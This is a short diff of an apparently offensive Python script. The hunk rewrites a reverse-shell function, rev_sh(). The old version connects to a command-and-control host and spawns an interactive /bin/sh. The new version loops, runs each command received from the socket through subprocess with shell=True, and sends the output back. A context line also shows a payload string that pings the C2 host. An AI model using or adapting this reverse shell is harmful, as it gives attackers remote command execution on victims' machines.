@@ -31,12 +31,11 @@ PAYLOAD1 = "python3 -c 'import os;os.system(\"ping -c 1 \" + \""+C2+"\")'"
 
 
 def rev_sh():
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s=socket.socket()
     s.connect((C2,PORT))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p=subprocess.Popen(["/bin/sh","-i"],stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    while True:
+        proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        s.send(proc.stdout.read() + proc.stderr.read())
 
 def touch_file():
     try:
